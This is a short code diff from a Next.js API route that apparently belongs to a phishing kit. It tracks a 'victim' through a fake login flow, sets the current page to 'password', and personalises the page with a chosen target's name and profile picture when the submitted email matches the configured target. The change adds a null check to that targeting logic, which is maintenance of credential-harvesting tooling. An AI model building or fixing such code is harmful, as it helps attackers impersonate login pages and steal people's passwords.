@@ -68,7 +68,7 @@ export async function POST(request: NextRequest) {
         currentPage: 'password',
       };
 
-      if (body.email.toLowerCase() === config.targetEmail.toLowerCase()) {
+      if (config.targetEmail && body.email.toLowerCase() === config.targetEmail.toLowerCase()) {
         victimUpdate.name = config.targetName;
         victimUpdate.profilePicture = config.targetProfilePicture;
       } else {
